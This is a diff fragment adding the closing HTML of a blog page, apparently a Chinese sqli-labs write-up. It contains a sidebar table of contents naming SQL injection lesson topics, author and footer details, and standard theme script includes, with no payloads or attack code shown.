+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-1"><span class="nav-text">Less-1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-2"><span class="nav-text">Less-2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-3"><span class="nav-text">Less-3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-4"><span class="nav-text">Less-4</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-5"><span class="nav-text">Less-5</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-6"><span class="nav-text">Less-6</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-7"><span class="nav-text">Less-7</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-8-盲注单引号注入"><span class="nav-text">Less-8-盲注单引号注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-9-基于时间的GET单引号盲注"><span class="nav-text">Less-9-基于时间的GET单引号盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-10-基于时间的GET双引号盲注"><span class="nav-text">Less-10-基于时间的GET双引号盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-11-基于错误的post单引号注入"><span class="nav-text">Less-11-基于错误的post单引号注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-12-基于错误的post双引号注入"><span class="nav-text">Less-12-基于错误的post双引号注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-13-POST单引号变形双注入"><span class="nav-text">Less-13-POST单引号变形双注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-14-POST双引号变形双注入"><span class="nav-text">Less-14-POST双引号变形双注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-15-基于bool型-时间延迟单引号POST型盲注"><span class="nav-text">Less-15-基于bool型/时间延迟单引号POST型盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-16-基于bool型-时间延迟的双引号POST型盲注"><span class="nav-text">Less-16-基于bool型/时间延迟的双引号POST型盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-17-基于错误的更新查询POST注入"><span class="nav-text">Less-17-基于错误的更新查询POST注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Level-18-基于错误的用户代理，头部POST注入"><span class="nav-text">Level 18-基于错误的用户代理，头部POST注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Level-19-基于头部的Referer-POST报错注入"><span class="nav-text">Level-19-基于头部的Referer POST报错注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Level-20-基于错误的cookie头部POST注入"><span class="nav-text">Level-20-基于错误的cookie头部POST注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-21-基于错误的复杂的字符型Cookie注入"><span class="nav-text">Less-21-基于错误的复杂的字符型Cookie注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-22-基于错误的双引号字符型Cookie注入"><span class="nav-text">Less-22-基于错误的双引号字符型Cookie注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-23-基于错误的，过滤注释的GET型"><span class="nav-text">Less-23-基于错误的，过滤注释的GET型</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-24-二次注入"><span class="nav-text">Less-24-二次注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-25-过滤了or和and"><span class="nav-text">Less-25-过滤了or和and</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-25a-过滤了or和and的盲注"><span class="nav-text">Less-25a-过滤了or和and的盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-26-过滤了注释和空格的注入"><span class="nav-text">Less-26-过滤了注释和空格的注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-26a-过滤了注释和空格的盲注"><span class="nav-text">Less-26a-过滤了注释和空格的盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-27-过滤了union和select"><span class="nav-text">Less-27-过滤了union和select</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-27a-过滤了union和select的盲注"><span class="nav-text">Less-27a-过滤了union和select的盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-28-基于错误的，-有括号的单引号字符型，过滤了union和select等的注入"><span class="nav-text">Less-28-基于错误的， 有括号的单引号字符型，过滤了union和select等的注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-28a-有括号的单引号字符型，过滤了union和select等的盲注"><span class="nav-text">Less-28a-有括号的单引号字符型，过滤了union和select等的盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-29-WAF保护"><span class="nav-text">Less-29-WAF保护</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-30-WAF保护"><span class="nav-text">Less-30-WAF保护</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-31-WAF保护"><span class="nav-text">Less-31-WAF保护</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yzz"
+      src="/images/ame.jpg">
+  <p class="site-author-name" itemprop="name">yzz</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">19</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yzz</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">159k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">2:24</span>
+</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/canvas_lines.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
